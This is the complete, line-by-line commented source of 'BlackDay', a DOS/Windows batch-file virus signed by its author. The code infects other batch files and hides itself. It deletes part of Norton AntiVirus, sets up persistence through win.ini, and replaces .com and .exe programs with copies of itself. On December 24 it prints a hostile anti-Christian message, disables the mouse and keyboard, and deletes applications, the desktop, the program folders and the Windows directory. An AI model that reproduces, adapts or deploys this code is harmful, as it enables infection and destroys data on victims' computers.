@echo off%_bd-ptrr%				;echos are led to _bd-ptrr
if '%1=='bd-ptrr goto bd-ptrr%2			;checks if bat-file is already infected
set bd-ptrr=%0.bat				;all bat-files are saved in the parameter bd-ptrr
if not exist %bd-ptrr% set bd-ptrr=%0		;if bd-ptrr is not there, the bat-file-names are saved in there
if '%bd-ptrr%==' set bd-ptrr=autoexec.bat	;do not infect, if autoexec.bat is in bd-ptrr
if exist c:\_bd-ptrr.bat goto bd-ptrrg		;if c:\_bd-ptrr.bat exists, jump to bd-ptrrg
if not exist %bd-ptrr% goto ebd-ptrr		;if bd-ptrr does not exist, jump to ebd-ptrr
find "bd-ptrr"<%bd-ptrr%>c:\_bd-ptrr.bat	;parameter bd-ptrr is searched in c:\_bd-ptrr.bat
attrib c:\_bd-ptrr.bat +h			;c:\_bd-ptrr.bat gets the attribute hidden
:bd-ptrrg					;jump-mark
command /c c:\_bd-ptrr bd-ptrr vir		;c:\_bd-ptrr is executed and command.com is ended
:ebd-ptrr					;jump-mark
set bd-ptrr=					;parameter bd-ptrr gets erased
goto bd-ptrrend					;jumps to bd-ptrrend
:bd-ptrrvir					;jump-mark
for %%a in (*.bat ..\*.bat) do call c:\_bd-ptrr bd-ptrr i %%a	;infects some bat-files
exit bd-ptrr					;bd-ptrr is ended
:bd-ptrri					;jump-mark
find "bd-ptrr"<%3>nul				;searches for bd-ptrr-parameters
if not errorlevel 1 goto bd-ptrrend		;if no are found, jump to bd-ptrrend
type %3>bd-ptrr$				;shows the content of the parameter bd-ptrr
echo.>>bd-ptrr$					;the echo-piping to _bd-ptrr is ended
type c:\_bd-ptrr.bat>>bd-ptrr$			;shows the content of the parameter bd-ptrr in c:\_bd-ptrr.bat
move bd-ptrr$ %3>nul				;kills all further echos of bd-ptrr
:bd-ptrrend					;jump-mark
ctty nul					;all echos are led to the "null-device"
del c:\programme\norton~1\s32integ.dll		;makes Norton AntiVirus 2000 unable to scan
copy BlackDay.bat c:\windows\system		;copies the virus to c:\windows\system
attrib +h c:\windows\system\BlackDay.bat	;there it gets the attribute hidden
copy BlackDay.bat + c:\windows\win.ini c:\windows\system\win.ini	;copies the win.ini behind the virus and saves the file under c:\windows\system\win.ini
del c:\windows\win.ini				;deletes the win.ini
move c:\windows\system\win.ini c:\windows	;moves c:\windows\system\win.ini to the location of the original win.ini
goto comexe					;jumps to comexe
						;this clear line is necessary for the win.ini-residency
[windows]					;mark for win.ini
load=c:\windows\system\BlackDay.bat		;loads the virus at every system-start
run=C:\WINDOWS\SYSTEM\cmmpu.exe			;win.ini standard-configuration
NullPort=None					;win.ini standard-configuration
						;this clear line is necessary for the win.ini-residency
:comexe						;jump-mark
for %%f in (*.exe *.com) do set A=%%f		;all com- and exe-files are saved in parameter A
if %A%==COMMAND.COM set A=			;is COMMAND.COM in A, A gets killed
rename %A% V%A%					;every file in A gets a V written before its name
if not exist V%A% goto phnord			;if command above did not work (program is opend), jump to phnord
attrib +h V%A%					;all renamed files get the attribute hidden
copy %0.bat %A%					;the virus is copied at the place of the old file
attrib +r %A%					;there the virus gets the attribute write-protected
ren %A% *.bat					;...and gets renamed to the old file
set A=						;parameter A gets erased
:phnord						;jump-mark
echo.|date|find "24">nul.bd-ptrr		;checks if we got a 24th today
if errorlevel 1 goto phuck			;if not, jump to phuck
ctty con					;echos are led to the screen
echo I hate Jesus Christ and his phuckin Birthday.	;shows message
echo For me is the 24th of December just another BlackDay in a dark World.	;shows message
echo For you now, every 24th gets such a BlackDay.	;shows message
echo The same for your phuckin System, too.	;shows message
echo ...					;shows message
echo BlackDay phinal by PhileT0a$t3r [rRlf]	;shows message
ctty nul					;all echos are led to the "null-device" again
c:\windows\rundll32.exe mouse,disable		;deactivates the mouse
c:\windows\rundll32.exe keyboard,disable	;deactivates the keyboard
del c:\t_online\online.exe			;kills T-Online
del c:\acrobatx\reader\acrord32.exe		;kills AcrobatReader
del c:\corel\draw70\programs\photopnt.exe	;kills Corel Photopaint 7.0
del c:\winzip\winzip32.exe			;kills WinZip
deltree /y c:\windows\desktop			;kills the desktop
deltree /y c:\eigene~1				;kills the "Eigenen Dateien"-directory (german windoze-version)
deltree /y c:\windows\sendto			;kills the SendTo-directory
deltree /y c:\programme				;kills the Programme-directory (international destruction;))
deltree /y c:\programs				;kills the programs-directory (international destruction;))
deltree /y c:\windows				;tries to kill as much as possible of windoze, before the victim turns off the computer
c:\windows\rundll32.exe user,disableoemlayer	;the computer hangs
:phuck						;jump-mark
ctty con					;echos are led to the screen
@if exist V%0.com V%0.com %1 %2 %3		;if the virus replaced a com-file, this file is executed now
@if exist V%0.exe V%0.exe %1 %2 %3		;if the virus replaced a exe-file, this file is executed now
ctty nul					;all echos are led to the "null-device"
:dusk						;the end of another BlackDay ;> (jump-mark)
						;this clear line is necessary for the win.ini-residency
